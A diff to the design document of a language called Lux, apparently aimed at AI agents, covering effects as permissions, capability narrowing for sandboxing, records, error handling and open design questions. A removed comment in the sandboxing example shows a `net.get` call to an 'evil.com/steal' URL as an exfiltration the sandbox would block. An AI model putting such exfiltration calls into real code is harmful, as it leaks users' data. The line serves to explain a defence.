@@ -144,24 +144,39 @@ fn fibonacci(n: u64) -> u64 {
 
 ### How Effects Connect to Code
 
-Each built-in effect corresponds to a standard library module with the same name. `Net` is both an effect and a module. `Fs` is both an effect and a module. The `can` clause is a permission gate: you can only call functions from the `net` module if your function declares `can Net`.
+There are two ways to use an effect: **module access** and **capability access**.
+
+**Module access** is the default. Each built-in effect corresponds to a standard library module. `can Net` grants permission to call `net.get()`, `net.post()`, etc. No import needed. The `can` clause is the permission gate.
 
 ```lux
-fn main() can Net, Fs, Console, Fail {
-    let config = load_config()?           // load_config uses fs module
-    let users = fetch_users(config.url)?  // fetch_users uses net module
-    print(format_report(users))           // print uses console module
-    write_report(users, config.path)?     // write_report uses fs module
+fn fetch(url: String) -> Bytes can Net, Fail {
+    net.get(url)?    // module access: requires can Net
 }
 ```
 
-No magic globals. No hidden parameters. `net.get(url)` is a normal function call to the `net` module. The compiler checks that the calling function has declared `can Net`. If it hasn't, the call is a compile error.
+**Capability access** is for when you need control over *which* instance. Pass the capability as a parameter. No `can` annotation needed for that effect, because the capability IS the parameter.
 
-This means the effect system is not a separate layer bolted onto the language. It IS the module permission system. Effects are modules. Modules are effects. One concept, not two.
+```lux
+fn save(db: Db, user: User) can Fail {
+    db.execute("insert into users ...", user)?   // capability access: db is a parameter
+}
+```
+
+The rule: use module access unless you need to pass a specific instance. Database connections, restricted network scopes, and test doubles are capability access. Everything else is module access.
+
+```lux
+fn main() can Net, Env, Console, Fail {
+    let config = load_config()?
+    let db = Db.connect(config.database_url)?   // create a capability value
+
+    // db flows as a parameter. net/env/console are module access.
+    net.serve(config.port, |req| handle(db, req))
+}
+```
 
 ### Capability Narrowing (Sandboxing)
 
-Capabilities can be narrowed for sandboxing. A restricted capability looks identical to the callee but limits what it can reach:
+Capabilities can be narrowed. A restricted capability looks identical to the callee but limits what it can reach:
 
 ```lux
 fn run_sandboxed() can Net, Fs, Fail {
@@ -171,17 +186,14 @@ fn run_sandboxed() can Net, Fs, Fail {
 }
 
 // This function doesn't know it's restricted.
-// It receives Net and Fs that look normal but are narrowed.
+// net and fs are parameters (capability access), not module access.
 fn agent_task(net: Net, fs: Fs) -> AgentOutput can Fail {
-    let data = net.get("https://api.example.com/data")?  // OK
-    // net.get("https://evil.com/steal")  would fail at runtime
+    let data = net.get("https://api.example.com/data")?
     let result = transform(data.body)
     fs.write("output.json", result)?
     AgentOutput { path: "output.json", size: result.len() }
 }
 ```
-
-When a function receives a narrowed capability as a parameter, it uses that parameter instead of the module global. This is the only case where capabilities appear as function parameters: when the caller is restricting what the callee can do.
 
 ### The `.` Shorthand (Field Projections in Closures)
 
@@ -273,6 +285,42 @@ fn load_user(id: UserId) -> User can Net, Db, Fail {
     user
 }
 ```
+
+### Records
+
+Records are ad-hoc key-value data. Use them at serialization boundaries (JSON responses, config, log entries). Use named structs for typed APIs between modules.
+
+```lux
+// #{ } is the record literal.
+let response = #{ status: "ok", count: 42 }
+let headers = #{ "Content-Type": "application/json" }
+
+// Records serialize to JSON naturally.
+json.encode(#{ user: name, age: 30 })  // {"user":"alice","age":30}
+```
+
+Records are not structs. They have no compile-time field checking. They're a `Map<String, Value>` with convenient syntax. The `#` prefix distinguishes them from blocks.
+
+### `fail` and Error Handling
+
+`fail` creates a failure. `?` propagates a failure. `catch` handles a failure. Three operations, one concept.
+
+```lux
+// fail is an expression of type Never. It works anywhere.
+let body = req.body ?? fail MissingBody
+let user = find(id) ?? fail NotFound(id)
+
+// ? propagates: if the left side is Err or None, return early.
+let data = parse(raw)?
+
+// catch absorbs the Fail effect.
+let result = catch risky_operation() {
+    Ok(value) => value,
+    Err(e) => default_value,
+}
+```
+
+`fail` requires `can Fail` in the enclosing function. `catch` removes `can Fail` from the enclosed expression. They are inverses.
 
 ### Operators for Absence
 
@@ -445,19 +493,30 @@ main                    can Net, Fs, Console, Fail
 
 An AI agent's output can be audited before execution. A CI pipeline can reject PRs that introduce unexpected effects. A security team can set policy: "this service may not use `Proc` or `Unsafe`."
 
+## Resolved Decisions
+
+See DECISIONS.md for the full rationale on each.
+
+- **Anonymous data:** `#{ }` record literals for serialization boundaries, named structs for typed APIs
+- **Effect modules:** Implicit (no import needed), `can` clause is the permission gate
+- **Connections:** Capability access (explicit parameter) for stateful resources, module access for stateless effects
+- **`fail`:** Expression of type `Never`, requires `can Fail`, counterpart to `?` and `catch`
+- **Closure effects:** Inferred from body, enclosing function must cover them
+- **`impl Trait`:** Sugar for bounded generics in argument position
+- **`Rand`:** Independent effect (reproducibility for testing)
+- **`??` with `fail`:** Works naturally because `Never` is a subtype of all types
+
 ## Open Questions
 
-1. **Async model.** Is async an effect (`Proc`) or a language primitive? Rust's async is powerful but complex. Go's goroutines are simple but hide concurrency. Where does Lux land?
+1. **Async model.** `can Async` and `spawn` exist in examples but the runtime model isn't specified. Green threads (Go)? Futures (Rust)? Effect handlers (Koka)?
 
-2. **Standard library scope.** Minimal (like Rust) or batteries-included (like Go)? The effect system makes batteries-included safer (every stdlib function declares its effects), but a large stdlib is a large maintenance burden.
+2. **Standard library scope.** Minimal (like Rust) or batteries-included (like Go)?
 
-3. **Interop story.** C FFI is essential for adoption. How does the effect system interact with foreign code? (Likely: all FFI calls are `! {Unsafe}` by default, with manual effect annotations for well-known libraries.)
+3. **C FFI.** All FFI calls are `can Unsafe`. How do we annotate well-known C libraries with their real effects?
 
-4. **Effect inference.** Should the compiler infer effects for private functions? (Probably yes for ergonomics, but explicit annotations on public functions are mandatory.)
+4. **Effect inference on private functions.** Probably yes for ergonomics, explicit on public functions mandatory.
 
-5. **Generics model.** Rust-style monomorphization or Go-style boxing? Monomorphization is faster but produces larger binaries and slower compiles. The AI-native tradeoff might favor faster compiles.
-
-6. **REPL and incremental compilation.** AI agents benefit from fast feedback loops. A REPL with effect tracking would be valuable but is hard to build for a compiled language.
+5. **Generics.** Monomorphization (fast execution, slow compilation) or boxing (fast compilation, runtime cost)?
 
 ## Influences
 
